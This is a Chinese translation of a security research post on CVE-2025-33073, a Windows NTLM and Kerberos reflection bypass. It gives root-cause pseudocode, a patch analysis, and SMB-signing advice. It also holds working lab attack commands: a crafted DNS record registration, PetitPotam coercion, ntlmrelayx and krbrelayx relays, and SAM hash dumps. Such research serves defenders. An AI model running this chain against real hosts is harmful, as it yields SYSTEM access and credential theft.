> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxODM5ODQzNQ==&mid=2247488885&idx=1&sn=c956b0f537a856ca365551087420ceee

#  NTLM 反射已死，NTLM 反射长存！——深入分析 CVE-2025-33073  
Wilfried Bécard  securitainment   2025-06-20 05:37  
  
> 【翻译】NTLM reflection is dead, long live NTLM reflection! – An in-depth   
  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
近二十年来，Windows 系统一直饱受 NTLM 反射漏洞的困扰。在本文中，我们将介绍 CVE-2025-33073，这是一个逻辑漏洞，它绕过了 NTLM 反射缓解措施，允许经过身份验证的远程攻击者在任何未强制执行 SMB 签名（SMB signing）的机器上以 SYSTEM 权限执行任意命令。本文将详细阐述该漏洞的发现过程、根本原因的完整分析以及微软的修复方案。  
## 引言  
  
NTLM 反射是 NTLM 认证中继（NTLM authentication relay）的一种特殊情况，其中原始认证被中继回发起认证的机器。这类漏洞最初通过 MS08-68 公之于众，微软在其中阻止了 SMB 到 SMB 的 NTLM 反射。多年来，其他利用途径（exploitation vectors）也被发现并修复，例如 HTTP 到 SMB 的反射（在 MS09-13 中修复）或 DCOM 到 DCOM 的反射（在 MS15-076 中修复）。  
  
如今，人们普遍认为 NTLM 反射攻击途径已被修复，但不时有研究表明，绕过缓解措施只是深入研究这些缓解措施实际工作原理的问题。  
  
最近，一条推文展示了 Kerberos 反射并未受到限制，这激发了我们的兴趣，并促使我们深入研究认证反射。  
## 漏洞发现  
  
作为测试的基线，让我们看看当尝试将 SMB 认证中继回同一台机器时会发生什么。我们的测试机器（SRV1）是一台最新的 Windows Server 2022，已加入域，且未强制执行 SMB 签名：  

```
$ PetitPotam.py -u loki -p loki -d ASGARD.LOCAL 192.168.56.3 SRV1.ASGARD.LOCAL
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!


# ntlmrelayx.py -t SRV1.ASGARD.LOCAL -smb2support
[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.56.14, attacking target smb://SRV1.ASGARD.LOCAL
[-] Authenticating against smb://SRV1.ASGARD.LOCAL as ASGARD/SRV1$ FAILED
```

  
PetitPotam 强制 SYSTEM 服务 (
```
lsass.exe
```

  
) 向受控机器进行身份验证，因此会收到机器账户的身份验证。由于身份验证源自同一台机器，中继失败。  
  
为了寻找异常行为，我们尝试调整了不同的参数，例如监听主机或客户端 IP 地址。我们注册了 
```
srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

  
 DNS 记录，并将其指向我们的 IP 地址。这种格式最早由 James Forshaw 记录，并在我们之前的博客文章中讨论过，可用于强制机器通过 Kerberos 向受控 IP 地址进行身份验证。当我们使用上述 DNS 记录作为监听器强制 SRV1 时，我们遇到了一个奇怪的行为：中继竟然成功了！  

```
$ dnstool.py -u 'ASGARD.LOCAL\loki' -p loki 192.168.56.10 -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 192.168.56.3
[-] Adding new record
[+] LDAP operation completed successfully


$ PetitPotam.py -u loki -p loki -d ASGARD.LOCAL srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA SRV1.ASGARD.LOCAL
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!


# ntlmrelayx.py -t SRV1.ASGARD.LOCAL -smb2support
[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.56.14, attacking target smb://SRV1.ASGARD.LOCAL
[*] Authenticating against smb://SRV1.ASGARD.LOCAL as / SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x0c10b250470be78cbe1c92d1b7fe4e91
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:df3c08415194a27d27bb67dcbf6a6ebc:::
user:1000:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70:::
[*] Done dumping SAM hashes for host: 192.168.56.14
```

  
更令人惊讶的是，
```
ntlmrelayx.py
```

  
 能够远程转储 SAM 数据库，这意味着我们中继的身份在目标机器上具有特权。这让我们感到奇怪，因为机器账户在其关联的机器上通常不具有特权。  
## 漏洞分析  
  
为了快速理解发生了什么，我们对两种中继攻击进行了网络抓包分析。一个明显的区别是：在使用 
```
srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

  
 主机名的中继攻击中，发生了 NTLM 本地认证！相反，当使用 IP 地址作为监听器强制机器时，则发生了标准的 NTLM 认证。  
### NTLM 本地认证  
  
NTLM 本地认证 是 NTLM 认证的一种特殊情况，在这种情况中，服务器会在 
```
NTLM_CHALLENGE
```

  
 消息中通知客户端无需在 
```
NTLM_AUTHENTICATE
```

  
 消息中计算挑战响应。相反，服务器会在挑战消息中设置 "Negotiate Local Call" 标志，创建一个服务器上下文，将其添加到全局上下文列表中，并将上下文 ID 插入 
```
Reserved
```

  
 字段。当客户端收到 
```
NTLM_CHALLENGE
```

  
 消息时，它会理解必须进行本地 NTLM 认证。然后，它会将其令牌添加到通过 
```
Reserved
```

  
 字段中的 ID 传递的服务器上下文中。由于客户端和服务器在同一台机器上，所有操作都在同一个 lsass.exe 进程内进行。最终，客户端会发送一个几乎为空的 
```
NTLM_AUTHENTICATE
```

  
 消息，服务器使用添加到其上下文中的令牌来执行进一步的操作（在我们的案例中是通过 SMB）。  
  
下面是使用 IP 地址作为监听器时服务器返回的 
```
NTLM_CHALLENGE
```

  
 消息的网络抓包。我们可以看到 
```
NTLMSSP_NEGOTIATE_LOCAL_CALL
```

  
 (
```
0x4000
```

  
) 位在协商标志中未启用，且 
```
Reserved
```

  
 标志为 NULL。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictjeQ7tXfHKRXZReicnZ18SmXgEud5EaPBgeecDTadT7xBZ18BmavP9PFIA/640?wx_fmt=png&from=appmsg "")  
  
NTLM_CHALLENGE message when the relay did not work.  
  
中继失败时的 NTLM_CHALLENGE 消息。  
  
相反，在另一个网络抓包中，该标志被设置且 
```
Reserved
```

  
 值不为 NULL：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictjehbHFwiaVcQr4CuZRRleeSEicR9dlQOiaH6usCZUTZqBNiaic46CR1bxPNTg/640?wx_fmt=png&from=appmsg "")  
  
NTLM_CHALLENGE message when the relay worked.  
  
中继成功时的 NTLM_CHALLENGE 消息。  
  
为了决定是否进行本地 NTLM 认证，服务器基于 
```
NTLM_NEGOTIATE
```

  
 消息中的两个字段做出判断：工作站名称和域名。
```
msv1_0!SsprHandleNegotiateMessage
```

  
 函数会检查客户端是否提供了工作站名称和域名，如果是，则将其与当前机器名称和域名进行比较。如果它们相等，服务器会在挑战消息中包含 
```
NTLMSSP_NEGOTIATE_LOCAL_CALL
```

  
 标志，创建一个服务器上下文并将其 ID 添加到 
```
Reserved
```

  
 字段中。下面是一个简化版的代码：  

```
NTSTATUS SsprHandleNegotiateMessage([...])
{
    Context = LocalAlloc(0x160);
[...]
    if ( RtlEqualString(&ClientSpecifiedWorkstationName, &NtLmGlobalOemPhysicalComputerNameString, 0) && RtlEqualString(&ClientSpecifiedDomainName, &NtLmGlobalOemPrimaryDomainNameString, 0) )
    {
        Context->Id = NtLmGlobalLoopbackCounter + 1;
        ChallengeMessage->Flags |= NTLMSSP_NEGOTIATE_LOCAL_CALL;
        InsertHeadList(&NtLmGlobalLoopbackContextListHead, Context);
        ChallengeMessage->ServerContextHandle = Context->Id;
    }
[...]
}
```

  
网络抓包分析证实了这一结论：当协商本地认证时，
```
NTLM_NEGOTIATE
```

  
 消息中包含了客户端的工作站名称和域名：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictjer6iaxWydFC02XLJ7cqkMW9EXakbqBqruzbiav4vV14xbic8VIoWibvj02Q/640?wx_fmt=png&from=appmsg "")  
  
中继成功时的 NTLM_NEGOTIATE 消息  
  
中继成功时的 NTLM_NEGOTIATE 消息。  
  
而在另一种情况下，这两个字段都被设置为 NULL：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictjeNU9FHWErWno5Uhx7eKM9ia8oraSzyE9jtlrpdQee9ibFG9hKElQUPSEw/640?wx_fmt=png&from=appmsg "")  
  
中继失败时的 NTLM_NEGOTIATE 消息  
  
中继失败时的 NTLM_NEGOTIATE 消息。  
  
这种行为差异表明客户端将 DNS 记录 
```
srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

  
 检测为等同于 localhost，并提示服务器应考虑进行 NTLM 本地认证。  
### 根本原因分析  
  
为了理解该漏洞的根本原因，我们回溯到 SMB 客户端 (
```
mrxsmb.sys
```

  
) 的认证上下文初始化过程。当检测到需要进行身份验证时，它会调用 
```
ksecdd!AcquireCredentialsHandle
```

  
 函数（该函数通过 RPC 调用 LSASS 中的等效用户模式函数），使用 
```
Negotiate
```

  
 包来获取包含当前用户身份的凭据句柄。随后，客户端调用 
```
ksecdd!InitializeSecurityContextW
```

  
，这也是一个对 LSASS 的 RPC 调用。根据认证强制是使用 IP 地址还是 DNS 记录完成，传递给 
```
InitializeSecurityContextW
```

  
 的目标名称可能如下：  
- cifs/192.168.56.3  
  
- cifs/srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA  
  
该函数的用户模式入口点是 
```
lsasrv!SspiExProcessSecurityContext
```

  
。此函数调用 
```
lsasrv!LsapCheckMarshalledTargetInfo
```

  
 来剥离目标名称中可能存在的编组目标信息：  

```
NTSTATUS LsapCheckMarshalledTargetInfo(UNICODE_STRING *TargetName)
{
[...]
    status = CredUnmarshalTargetInfo(TargetName->Buffer, TargetName->Length, 0, &TargetInfoSize);
    if (NT_SUCESS(status))
    {
        Length = TargetName->Length;
        TargetName->MaximumLength = TargetName->Length;
        TargetName->Length = Length - TargetInfoSize;
    }
[...]
    return status;
}
```

  
在该函数调用后，目标名称现在看起来如下：  
- cifs/192.168.56.3  
  
- cifs/srv1  
  
随后，LSASS 会调用已协商的认证包（在本例中为 NTLM），更具体地说，是调用 
```
msv1_0!SpInitLsaModeContext
```

  
 函数。由于需要构造 
```
NTLM_NEGOTIATE
```

  
 消息，因此会调用 
```
msv1_0!SsprHandleFirstCall
```

  
。在该函数内部，会执行多项检查以决定是否在 
```
NTLM_NEGOTIATE
```

  
 消息中包含工作站名称和域名：  

```
NTSTATUS SsprHandleFirstCall(
        HANDLE CredentialHandle,
        NTLM_SSP_CONTEXT **SspContext,
        ULONG fContextReq,
        int a4,
        PSSP_CREDENTIAL Credential,
        UNICODE_STRING *TargetName,
        _DWORD *a7,
        void **a8,
        LARGE_INTEGER SystemTime,
        LARGE_INTEGER *a10,
        _OWORD *a11,
        LARGE_INTEGER LocalTime)
{
    SspCredentialReferenceCredentialEx(CredentialHandle, 0, 1, &Credential);
[...]
    SspIsTargetLocalhost(1, TargetName, &SspContext->IsLoopbackAllowed);
[...]
    if (!SspContext->IsLoopbackAllowed && !NtLmGlobalDisableLoopbackCheck
        || (fContextReq & ISC_REQ_NULL_SESSION) != 0
        || Credential->DomainName
        || Credential->UserName
        || Credential->Password) {
        SspContext->CheckForLocal = FALSE;
    } else {
        SspContext->CheckForLocal = TRUE;
    }
[...]
    if (SspContext->CheckForLocal) {
        RtlCopyAnsiString(WorkstationName, NtLmGlobalOemPhysicalComputerNameString);
        RtlCopyAnsiString(DomainName, NtLmGlobalOemPrimaryDomainNameString);
        NegotiateMessage->OemWorkstationName =  WorkstationName;
        NegotiateMessage->OemDomainName =  DomainName;
    }
[...]
```

  
首先，
```
msv1_0!SspIsTargetLocalhost
```

  
 函数用于判断目标名称是否对应当前机器。为此，服务类后面的部分（192.168.56.3 或 srv1）会与以下字符串进行不区分大小写的比较：  
- 机器的 FQDN（SRV1.ASGARD.LOCAL）  
  
- 机器的主机名（SRV1）→ 在本例中匹配成功！  
  
- localhost  
  
如果没有匹配项，目标名称会被视为 IP 地址，并与当前机器分配的所有 IP 地址进行比较。如果以上检查都未通过，则认为目标名称与当前机器不同。  
  
最后，当满足以下所有条件时，工作站和域名会被包含在 
```
NTLM_NEGOTIATE
```

  
 消息中：  
- 目标是当前机器  
  
- 客户端未请求 NULL 认证  
  
- 使用了当前用户的凭证（未指定显式凭证）  
  
在本例中，所有这些条件都为真，这就是为什么 SMB 客户端在使用名称 
```
srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

  
 进行强制认证时，会提示服务器进行本地 NTLM 认证。  
  
最后一个问题是：为什么我们在机器上拥有特权？因为 PetitPotam 强制 
```
lsass.exe
```

  
 向我们的服务器进行认证，而 
```
lsass.exe
```

  
 以 SYSTEM 身份运行。当客户端（
```
lsass.exe
```

  
）收到指示必须执行本地 NTLM 认证的 
```
NTLM_CHALLENGE
```

  
 消息时，它会将其 SYSTEM 令牌复制到服务器上下文中。当服务器收到 
```
NTLM_AUTHENTICATE
```

  
 消息时，它会从上下文对象中检索令牌并模拟它，以通过 SMB 执行进一步操作（在本例中，使用远程注册表服务转储 SAM 配置单元并入侵机器）。  
  
作为一个小彩蛋，我们注意到可以注册单个 DNS 记录来入侵任何易受攻击的机器：
```
localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

  
。实际上，当从目标名称中剥离编组的目标信息时，只剩下 
```
localhost
```

  
，这意味着 
```
msv1_0!SspIsTargetLocalhost
```

  
 中的检查也会通过，无论机器的主机名是什么。  
## Kerberos 的情况如何？  
### Negotiate 工作流程  
  
在首次发现后，我们想知道 Kerberos 是否也受到影响。毕竟，如前所述，Kerberos 没有针对反射攻击的保护措施。因此，我们通过将 
```
ntlmrelayx.py
```

  
 替换为 
```
krbrelayx.py
```

  
 来执行相同的攻击：  

```
$ PetitPotam.py -u loki -p aloki -d ASGARD.LOCAL srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA SRV1.ASGARD.LOCAL
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!


# krbrelayx.py -t SRV1.ASGARD.LOCAL -smb2support
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 192.168.56.13
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[-] No negTokenInit sent by client
```

  
有趣的是，尽管我们提供了 DNS 记录作为监听主机，且 
```
krbrelayx.py
```

  
 将 Kerberos 作为其认证协议之一进行宣传，但最终协商的却是 NTLM 认证。原因很简单，这与 Negotiate 认证包的工作机制有关：如果远程服务器同时支持 Kerberos 和 NTLM（
```
krbrelayx.py
```

  
 就是这种情况），并且客户端检测到目标是当前机器，那么就会使用 NTLM（以执行本地 NTLM 认证）。为了确定目标是否与客户端所在机器相同，系统会调用 
```
lsasrv!NegpIsLoopback
```

  
 函数。与 
```
msv1_0!SspIsTargetLocalhost
```

  
 函数类似，它会将目标名称与 localhost、机器的 FQDN 及其主机名进行比较。在我们的案例中，目标名称等于主机名，因此 
```
lsasrv!NegpIsLoopback
```

  
 返回 true，从而协商使用 NTLM。要强制使用 Kerberos，只需从宣传的类型中移除 NTLM mechtype：  

```
File: krbrelayx/lib/servers/smbrelayserver.py
156:         blob['tokenOid'] = '1.3.6.1.5.5.2'
157:         blob['innerContextToken']['mechTypes'].extend([MechType(TypesMech['KRB5 - Kerberos 5']),
158:                                                        MechType(TypesMech['MS KRB5 - Microsoft Kerberos 5']),
159:                                                        MechType(TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'])])
```

  
应用此补丁后，中继攻击同样奏效！  

```
$ PetitPotam.py -u loki -p aloki -d ASGARD.LOCAL srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA SRV1.ASGARD.LOCAL
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!


# krbrelayx.py -t SRV1.ASGARD.LOCAL -smb2support
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 192.168.56.13
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x2969778d862ac2a6df59a263a16adbd1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04e87eb3e0d31f79a461386dfe9c7500:::
user:1000:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70:::
[*] Done dumping SAM hashes for host: srv1.asgard.local
```

  
我们采用了相同的调查技术：首先分析网络捕获数据以了解发生了什么。然而，捕获数据并未显示出任何异常。通过认证强制，我们获取并中继了针对 
```
cifs/srv1
```

  
 服务的 
```
AP-REQ
```

  
，使用 
```
SRV1$
```

  
 账户，这正是 Kerberos 认证强制所预期的结果。再次强调，能够转储 SAM 注册表配置单元让我们感到困扰，因为机器账户（在本例中是被中继的身份）在其关联机器上并不具备特权。  
### 根本原因  
  
当 SMB 客户端协商使用 Kerberos 而非 NTLM 时，会调用 
```
kerberos!SpInitLsaModeContext
```

  
 函数。该函数调用 
```
kerberos!KerbBuildApRequest
```

  
，后者又调用 
```
kerberos!KerbMakeKeyEx
```

  
 来创建子密钥（subkey），这是一个客户端和服务器在认证阶段后可选使用的加密密钥。子密钥被插入到客户端发送的 
```
AP-REQ
```

  
 的认证器部分。如果使用 AES（默认情况），子密钥通过调用 
```
cryptdll!aes256RandomKey
```

  
 随机生成。  
  
之后，如果当前用户是 
```
NT AUTHORITY\SYSTEM
```

  
 或 
```
NT AUTHORITY\NETWORK SERVICE
```

  
，则会调用 
```
kerberos!KerbCreateSKeyEntry
```

  
 函数：  

```
NTSTATUS SpInitLsaModeContext([...])
{
[...]
    KerbReferenceCredentialEx(CredentialHandle, 2u, 0, 0, &Credential);
[...]
    if ((Credential.LogonId.LowPart == 0x3E7 || Credential.LogonId.LowPart == 0x3E4) &&  Credential.LogonId.HighPart == 0) {
        GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
        &SystemTimeAsFileTime += 2 * KerbGlobalSkewTime.QuadPart;
        KerbCreateSKeyEntry(
            &Credential.LogonId,
            &SubsessionKey,
            &SystemTimeAsFileTime,
            &TokenHandle
        );
    }
}
```

  
函数 
```
kerberos!KerbCreateSKeyEntry
```

  
 会创建一个包含当前用户的 LUID（本地唯一标识符）、子密钥（subkey）、其过期时间以及当前用户令牌的子密钥条目。该子密钥条目随后会被添加到 
```
kerberos!KerbSKeyList
```

  
 全局列表中：  

```
NTSTATUS KerbCreateSKeyEntry(
        LUID *Luid,
        struct _KERB_ENCRYPTION_KEY *SubsessionKey,
        struct _FILETIME *ExpirationTime,
        void *TokenHandle)
{
[...]
    SessionKeyEntry->Luid = *Luid;
    SessionKeyEntry->TokenHandle = TokenHandle;
    SessionKeyEntry->ExpirationTime = ExpirationTime;
[...]
    RtlAcquireResourceExclusive(&KerbSKeyLock, 1u);
    InsertHeadList(&KerbSKeyList, SessionKeyEntry);
    RtlReleaseResource(&KerbSKeyLock);
}
```

  
当服务器接收到 
```
AP-REQ
```

  
 时，它会调用 
```
AcceptSecurityContext
```

  
，该函数将调用转发给 
```
kerberos!SpAcceptLsaModeContext
```

  
。该函数对 
```
AP-REQ
```

  
 执行多项检查，解密后调用 
```
kerberos!KerbCreateTokenFromTicketEx
```

  
 从检索到的 
```
AP-REQ
```

  
 创建令牌。这里有趣的部分是：如果从票据中提取的客户端名称等于机器名称（
```
kerberos!KerbGlobalMachineServiceName
```

  
），则会调用 
```
kerberos!KerbDoesSKeyExist
```

  
 函数来检查 
```
AP-REQ
```

  
 子密钥是否存在于 
```
kerberos!KerbSKeyList
```

  
 全局列表中，并检查关联的登录 ID 是否对应于 
```
NT AUTHORITY\SYSTEM
```

  
：  

```
NTSTATUS KerbCreateTokenFromTicketEx([…])
{
[...]
    KerbConvertPrincipalNameToString(PrincipalName, EncryptedTicket->ClientName);
[...]
    if (RtlEqualUnicodeString(PrincipalName, &KerbGlobalMachineServiceName, 1u) && KerbIsThisOurDomain(Domain))
    {
        IsSystem = FALSE;
        KerbDoesSKeyExist(SubKey, &SubKeyExists, &Luid, &TokenHandle);
        if (SubKeyExists)
        {
            if (Luid.LowPart == 0x3E7 && Luid.HighPart == 0)
            {
                IsSystem = TRUE;
            }
        }
[...]
    }
[...]
    KerbMakeTokenInformationV3([...], IsSystem, […]);
}
```

  
新的令牌信息在 
```
kerberos!KerbMakeTokenInformationV3
```

  
 中生成，如果 
```
IsSystem
```

  
 为真，则令牌信息的 
```
User
```

  
 字段会被设置为 SYSTEM，并且本地管理员 SID 会被添加到 groups 字段中。  

```
NTSTATUS KerbMakeTokenInformationV3([...], BOOL IsSystem, […])
{
[...]
 if (IsSystem)
 {
     RtlInitializeSid(LocalAdminSid, &IdentifierAuthority, 2u);
     *RtlSubAuthoritySid(LocalAdminSid, 0) = 32;
     *RtlSubAuthoritySid(LocalAdminSid, 1u) = 544;
 }        
[...]
 if (IsSystem)
    {
     TokenInfo->User.User.Sid = TokenSid;
     RtlCopySid(0xCu, TokenSid, &SystemSid);
     [...]
    }
}
```

  
最终，系统会调用 
```
lsasrv!LsapCreateTokenEx
```

  
 函数，使用之前生成的令牌信息来创建令牌。在我们的案例中，创建了一个 SYSTEM 令牌并将其与客户端关联。  
## 补丁分析与建议  
  
Microsoft 将 CVE-2025-33073 描述为 SMB 客户端中的一个漏洞。因此，为了理解该补丁，我们将打补丁前后的 
```
mrxsmb.sys
```

  
 内核驱动进行了对比分析。对比结果显示只有少数函数被修改。其中最值得注意的是 
```
mrxsmb!SmbCeCreateSrvCall
```

  
 函数，该函数在尝试通过 SMB 访问资源时被调用。以下是新增的代码：  

```
NTSTATUS SmbCeCreateSrvCall([...])
{
[...]
    if ((unsigned int)CredUnmarshalTargetInfo(TargetName->Buffer, TargetName->Length, 0, 0) != STATUS_INVALID_PARAMETER ) {
        return STATUS_INVALID_PARAMETER;
    }
[...]
```

  
函数 
```
ksecdd!CredUnmarshalTargetInfo
```

  
 在目标名称不包含任何封装的（marshalled）目标信息或格式不正确时会失败。因此，添加此调用是为了在检测到使用带有封装目标信息的目标名称时阻止任何 SMB 连接。因此，该补丁通过移除通过注册带有封装目标信息的 DNS 记录来强制机器通过 Kerberos 进行身份验证的能力，从而防止了该漏洞的利用。然而，通过找到替代 DNS 记录技术的方法来强制客户端向我们的中继服务器进行身份验证，该漏洞可能仍然可被利用。  
  
要正确修复该漏洞，请参考 Microsoft 官方公告。此外，为防止未来与 SMB 身份验证中继相关的任何漏洞，请尽可能在您的机器上强制执行 SMB 签名。在这种情况下，即使不应用补丁，强制执行 SMB 签名也能防止该漏洞的利用。  
## 结论  
  
尽管 Microsoft 将 CVE-2025-33073 称为权限提升漏洞，但实际上它是在任何未强制执行 SMB 签名的机器上以 SYSTEM 身份执行的经过身份验证的远程命令执行漏洞。  
  
在本篇博客文章中，我们描述了我们是如何意外发现该漏洞的，详细介绍了我们快速了解漏洞特性的方法，并深入研究了 LSASS 内部机制以全面理解漏洞的工作流程。最后，我们分析了官方补丁，说明该漏洞仅用几行代码就得到了修复。  
  
最后，我们想强调 CVE-2025-33073 是一个很好的例子，说明了为什么启用纵深防御（defense-in-depth）缓解措施（如 SMB 签名）可以非常有效，即使面对 0-day 漏洞也是如此。同时，也要感谢其他独立向 Microsoft 报告该漏洞的研究人员！  
  
